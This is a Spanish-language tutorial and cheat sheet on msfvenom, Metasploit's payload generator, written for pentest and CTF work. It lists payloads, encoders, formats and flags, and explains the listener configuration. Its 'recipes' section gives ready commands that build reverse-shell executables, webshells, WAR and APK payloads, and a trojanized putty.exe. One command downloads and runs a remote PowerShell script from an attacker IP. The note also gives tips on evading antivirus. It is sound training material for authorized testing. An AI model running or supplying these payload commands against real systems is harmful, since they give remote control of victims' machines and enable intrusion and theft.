---
tags:
  - ciberseguridad
  - herramientas
  - msfvenom
tipo: herramienta
estado: terminado
---

# Msfvenom

**Msfvenom** es la herramienta de generación de payloads del framework **Metasploit**. Combina en un solo binario las funciones de los desaparecidos `msfpayload` y `msfencode`: toma un payload del catálogo de Metasploit, lo transforma (codificación, mala‑carácteres, plantilla), lo empaqueta en el formato de entrega elegido (exe, elf, war, aspx, raw…) y lo deja listo para el *delivery* de una explotación.

> [!info] Qué es y qué no es
> Msfvenom **genera** el artefacto; no lo entrega, no lo ejecuta y no escucha. El flujo completo es: `msfvenom` (generar) → entrega (web, USB, spear‑phishing, sesión existente) → `multi/handler` (escuchar) → sesión Meterpreter/Shell. Sin el handler configurado **idéntico**, el payload generado es un archivo muerto — es el error #1 de principiantes.

## Msfvenom vs las herramientas hermanas

| Herramienta | Rol | Relación con msfvenom |
|---|---|---|
| **msfvenom** | Genera payloads y shellcode empaquetados | — |
| **multi/handler** (Msfconsole) | Escucha la conexión entrante del payload | Siempre su complemento obligatorio |
| **msfencode / msfpayload** | Predecesores (herramientas separadas) | Eliminados en Metasploit 4.x+; msfvenom los unificó |
| **msfvenom + C2 externo** | Payload conectando a Cobalt Strike/Sliver/etc. | Solo los payloads `reverse_tcp`/`reverse_http` genéricos sirven; los meterpreter no |
| **donut / sRDI** | Shellcode .NET → shellcode in‑memory | Complementarios: msfvenom genera el .NET, donut lo convierte a shellcode |
| **Veil / ScareCrow** | Evasión AV por generación de loaders | Alternativa cuando el AV ignora los encoders de msfvenom (que los ignora, ver más abajo) |

## Instalación

| Contexto | Comando |
|---|---|
| **Kali Linux** | Preinstalado — `msfvenom --version` |
| Debian/Ubuntu | Incluido con el paquete `metasploit-framework` |
| Windows | Installer oficial de Rapid7; también en WSL |

## Anatomía de un comando

```bash
msfvenom -p <payload> <variable>=<valor> ... -e <encoder> -i <iter> -b <badchars> -f <format> -o <salida>
```

| Fragmento | Función |
|---|---|
| `-p, --payload` | Payload del catálogo (plataforma/tipo/transporte) |
| `LHOST` / `LPORT` | Variables del payload: IP y puerto del atacante |
| `-e, --encoder` | Codificador (transformación, no evasión — ver sección) |
| `-i, --iterations` | Iteraciones del codificador |
| `-b, --bad-chars` | Bytes prohibidos que el exploit no puede transportar |
| `-f, --format` | Formato de salida del artefacto |
| `-o, --out` | Archivo de salida |
| `--list` | Explorar el catálogo |

## Catálogo de payloads (por escenario)

### Windows — los de uso diario

| Payload | Tipo | Cuándo usarlo |
|---|---|---|
| `windows/meterpreter/reverse_tcp` | Stager + sesión interactiva completa | **Default de facto**: funciona a través de NAT, requiere handler |
| `windows/meterpreter/reverse_http(s)` | Stager por HTTP(S) | Atraviesa proxies/firewalls que solo permiten 80/443 |
| `windows/meterpreter/bind_tcp` | Bind en el puerto del objetivo | Cuando hay ruta **hacia** el objetivo pero no de vuelta (raro en redes modernas) |
| `windows/shell/reverse_tcp` | Shell cmd.exe reversa | Cuando meterpreter es detectado por el AV y hace falta un stager genérico |
| `windows/x64/meterpreter/reverse_tcp` | 64 bits | **Requerido** para procesos x64 nativos; los payloads x86 inyectan en procesos WOW64 |
| `windows/meterpreter/reverse_tcp_udp` | Reverse TCP o UDP | Redes donde TCP está filtrado pero UDP pasa |

### Linux

| Payload | Tipo | Cuándo usarlo |
|---|---|---|
| `linux/x86/meterpreter/reverse_tcp` | Stager x86 | Servidores 32 bits |
| `linux/x64/meterpreter/reverse_tcp` | Stager x64 | Lo habitual hoy |
| `linux/x64/shell_reverse_tcp` | Shell /bin/sh reversa | Liviano, evade firmas específicas de meterpreter |
| `linux/x64/meterpreter/bind_tcp` | Bind | Objetivo sin salida a la red del atacante |

### Otros objetivos frecuentes en CTF/pentest

| Payload | Formato habitual de entrega |
|---|---|
| `android/meterpreter/reverse_http` | APK (`-f apk`) |
| `java/jsp_shell_reverse_tcp` | JSP en servidores Tomcat |
| `java/meterpreter/reverse_http` | WAR (`-f war`) para Tomcat/JBoss |
| `php/meterpreter/reverse_tcp` | `-f raw` → `<?php eval(...); ?>` en uploads PHP |
| `python/meterpreter/reverse_tcp` | `-f raw` → script Python |
| `cmd/windows/reverse_powershell` | `-f psh-cmd` — una línea para el intérprete |

> [!warning] Stagers vs stageless — la distinción que decide el tamaño
> - **Stager** (`reverse_tcp`, `reverse_http`): el artefacto es **pequeño** (~100‑350 B de shellcode); su primer job es descargar la *stage* (Meterpreter completo) desde el handler. Requiere el handler corriendo.
> - **Stageless** (`meterpreter_reverse_tcp`, `meterpreter_reverse_http`): el payload completo va **dentro** del artefacto (≈ 800 KB+). Más fiable (no depende de que el stager sobreviva al AV) pero enorme y más fácil de firmar.
> Convenio de nombres: los stageless llevan el prefijo del módulo completo (`meterpreter_...`), los stagers el atajo (`reverse_...`).

### Reverse vs bind — cómo elegir

| Situación | Elección |
|---|---|
| El objetivo puede conectarse a ti (lo normal: VPN, LAN, Internet) | **Reverse** |
| Hay firewall con estado que solo permite tráfico entrante al objetivo | **Bind** + port forwarding |
| Salida solo por web corporativa | `reverse_http(s)` con `-LHOST` = servidor C2 |
| DNS filtrado pero UDP abierto | `reverse_tcp_udp` |

## Codificadores: qué hacen realmente (y por qué NO evaden el AV)

| Encoder | Uso |
|---|---|
| `x86/shikata_ga_nai` | XOR polymórfico con mutación en cada iteración — el clásico |
| `x86/borland` | Casi no añade código (útil cuando hay líneas de bytes muy restrictivas) |
| `generic/none` | Sin codificar (referencia para comparar) |

**Qué hace un encoder**: transformar el shellcode para (1) **eliminar bad characters** — `\x00` rompe cadenas C, `\x0a`/`\x0d` rompen ASCII transports — y (2) hacer que el código resultante no sea un patrón estático. El decodificador es un stub al inicio que restaura el código en runtime.

**Por qué no evita el antivirus**: los firmas modernas de AV no detectan el shellcode byte a byte — detectan (a) la **plantilla de ejecutable** del empaquetador de Metasploit (idéntica en todos los `exe` de msfvenom), (b) el **stub del decodificador**, y (c) comportamientos (creación de hilos, escritura en memoria, reverse shell). Un encoder extra + iteraciones cambia los bytes pero **no** el stub ni la plantilla: la tasa de detección de un exe de msfvenom crudo ronda el 95‑100 % en VirusTotal. Las soluciones reales de evasión están fuera de esta nota ( loaders propios, .NET en memoria, ofuscación manual — se auditan con [[Ghidra - Reverse Engineering Tool]]).

> [!warning] No subas tus payloads a VirusTotal desde la cuenta del cliente
> VirusTotal comparte los archivos con sus socios antivirus: un payload "de prueba" puede ser ingerido y firmado, y esa firma aparecerá **antes** del engagement real. Para chequeo de detección usar un sandbox privado o el check de firmas local del AV objetivo.

## Formatos de salida frecuentes (`-f`)

| Formato | Artefacto | Escenario típico |
|---|---|---|
| `exe` | Ejecutable Windows | Entrega por correo/USB |
| `dll` | Biblioteca Windows | Side‑loading, plantilla |
| `elf` | Binario Linux | Servidor comprometido |
| `macho` | Binario macOS | Objetivos Apple |
| `apk` | Aplicación Android | Payload `android/...` |
| `war` | Java web app | Tomcat/JBoss (`java/...`) |
| `aspx` / `asp` / `jsp` | Webshell | Uploads en IIS / Tomcat |
| `ps1` | Script PowerShell | `cmd/windows/reverse_powershell` con `-f psh-cmd` |
| `python` / `bash` / `perl` / `ruby` | Script | Ejecución rápida sin compilación |
| `c` | Array `unsigned char buf[]` | Inyección manual en exploits propios |
| `raw` | Shellcode plano | Inyección en un template o exploit existente |
| `hex` | Shellcode en hex | Pegar en herramientas de debugging |

## Flags avanzados de transformación

| Flag | Función | Ejemplo |
|---|---|---|
| `-x, --template` | Usa un ejecutable legítimo como plantilla | `-x /usr/share/seclabs/putty.exe` |
| `-k, --keep` | Mantiene el comportamiento de la plantilla (el programa original sigue funcionando con el payload inyectado) | `-k` |
| `-e, --encoder` | Codificador | `-e x86/shikata_ga_nai` |
| `-i, --iterations` | Iteraciones de codificación | `-i 5` |
| `-b, --bad-chars` | Bytes a evitar | `-b "\x00\x0a\x0d"` |
| `-n, --nopsled` | NOP sled al inicio (payloads pequeños en memoria) | `-n 32` |
| `-c, --add-code` | Shellcode externo adicional incrustado | `-c extra.bin` |
| `-a, --arch` | Arquitectura (`x86`, `x64`, `arm`, `armle`, `mipsbe`…) | `-a x64` |
| `--platform` | Plataforma (`windows`, `linux`, `android`…) | `--platform windows` |
| `--smallest` | Genera el payload más pequeño posible | `--smallest` |
| `--srcheip` / `--srcport` / `--dstip` / `--dstport` | Fijar campos IP/puerto del shellcode (evade NIDS con IP binding) | `--srcheip 10.0.0.5` |
| `--stager-retries` | Reintentos del stager al conectar | `--stager-retries 3` |

## Variables de payload

| Variable | Significado | Ejemplo |
|---|---|---|
| `LHOST` | IP de retorno del atacante (usar IP de la VPN/interfaz TUN, **no** 127.0.0.1) | `LHOST=10.10.14.5` |
| `LPORT` | Puerto de escucha — usar 443/80/53 cuando el firewall filtra por destino | `LPORT=443` |
| `RHOST` | Solo payloads bind: destino | `RHOST=10.10.10.50` |
| `EXITFUNC` | Cómo termina el proceso hospedador: `thread` (no mata al proceso — más discreto), `process` (termina el proceso), `seh` (Windows) | `EXITFUNC=thread` |
| `PrependMigrate` | Migración automática a otro proceso tras la ejecución (solo Windows, mejora resiliencia) | `PrependMigrate=true` |
| `AutoRunScript` | Script de Meterpreter a ejecutar al abrir sesión (en el handler) | `AutoRunScript=post/windows/manage/migrate` |

## Descubrimiento del catálogo

```bash
msfvenom --list payloads        # todos los payloads (~1000+)
msfvenom --list payloads | grep meterpreter/reverse   # filtrar
msfvenom --list encoders        # codificadores
msfvenom --list formats         # formatos de salida
msfvenom --list archs           # x86, x64, arm, armle, mipsbe, mipsle...
msfvenom --list platforms       # windows, linux, android, osx, java, php...
msfvenom -p windows/x64/meterpreter/reverse_tcp --payload-options   # variables del payload
```

## Patrón del listener (`multi/handler`) — la otra mitad

Todo payload reverso necesita un handler con **la misma configuración**:

```bash
msfconsole -q -x "use exploit/multi/handler; \
  set payload windows/x64/meterpreter/reverse_tcp; \
  set LHOST 10.10.14.5; \
  set LPORT 443; \
  set ExitOnSession false; \
  run -j"
```

| Opción del handler | Por qué |
|---|---|
| `payload` idéntico al `-p` usado | Si difieren, no hay sesión — sin error, simplemente no llega nada |
| `LHOST` = IP **visible** desde el objetivo (tun0, interfaz pública) | `127.0.0.1` solo funciona con port forwarding deliberado |
| `ExitOnSession false` | El handler sigue vivo para capturar segunda sesión / reintentos |
| `run -j` | Como job en background, permite múltiples handlers |

## Recetas de la vida real

```bash
# 1. Exe reverso Windows x64 (receta base)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o payload.exe

# 2. Mismo payload, con plantilla legítima y sin matar el proceso
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 \
  -x putty.exe -k -f exe -o putty_infected.exe

# 3. Shellcode C para incrustar en un exploit propio (sin plantilla)
msfvenom -p windows/exec CMD='cmd.exe /c powershell -ep bypass -f <http://10.10.14.5/s.ps1>' \
  -b "\x00" -f c -o shellcode.c

# 4. ELF reverso Linux
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=9001 -f elf -o shell.elf

# 5. Webshell ASPX para upload en IIS
msfvenom -p windows/x64/meterpreter/reverse_http LHOST=10.10.14.5 LPORT=8080 -f aspx -o shell.aspx

# 6. WAR para Tomcat
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=9001 -f war -o shell.war

# 7. APK de Android
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f apk -o app.apk

# 8. Una línea de PowerShell (pegar en consola comprometida)
msfvenom -p cmd/windows/reverse_powershell LHOST=10.10.14.5 LPORT=9001 -f psh-cmd

# 9. Payload con IP embebida (evade NIDS que correlaciona tráfico imposible)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 \
  --srcheip 10.10.14.5 -f exe -o payload.exe
```

## Errores comunes (con mensajes exactos)

| Mensaje / síntoma | Causa | Fix |
|---|---|---|
| `No payload was selected` / nada de salida | Falta `-p` o el nombre del payload está mal escrito | Copiar el nombre de `--list payloads` |
| `Unable to find the requested encoder` | Encoder inexistente para esa arquitectura | `msfvenom --list encoders` y elegir uno compatible (`generic/none` siempre existe) |
| Payload generado pero **nada llega al handler** | LHOST != IP visible desde el objetivo, o payload del handler ≠ payload generado | Coordinar LHOST/LPORT/transport; revisar firewall local |
| `Unable to find a compatible encoder for the specified payload` | Payload puro (python, php…) no necesita/codifica encoder | Usar `-f raw` directamente |
| El exe no ejecuta en x64 | Payload x86 en proceso x64 puro (sin WOW64) | Regenerar con `-p windows/x64/...` |
| AV borra el exe al generarlo | El AV local reconoce la plantilla de Metasploit | Excluir el directorio de trabajo (entorno autorizado) o usar template propio |
| Sesión muere en segundos | `EXITFUNC=process` mató el proceso hospedador al finalizar | `EXITFUNC=thread` + migración |

## Cheatsheet

```bash
msfvenom --list payloads | grep <patrón>
msfvenom -p <payload> LHOST=<ip> LPORT=<puerto> -f <formato> -o salida
msfvenom -p <payload> ... -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -i 3 -f exe -o out.exe
msfvenom -p <payload> ... -x plantilla.exe -k -f exe -o out.exe

msfconsole -q -x "use exploit/multi/handler; set payload <payload>; set LHOST <ip>; set LPORT <puerto>; run -j"
```

## Referencias

- Metasploit Unleashed (oficial, gratuito): <https://www.offsec.com/metasploit-unleashed/>
- Repositorio: <https://github.com/rapid7/metasploit-framework>
- Guía de payloads: <https://docs.metasploit.com/docs/using-metasploit/interact/payloads/>
- Conceptos: [[Enumeración de Servicios y CMS]] (fase de explotación), [[Nmap Guía Completa]] (descubrimiento de servicios a atacar)

## Relacionadas

- [[THC Hydra]] — fuerza bruta cuando aún no hay explotación
- [[CrackMapExec Guía de Uso]] — post‑explotación SMB con credenciales
- [[Ghidra - Reverse Engineering Tool]] — auditar la detección de tu artefacto
- [[Nmap Guía Completa]] — confirmar alcance/versión antes de generar el payload
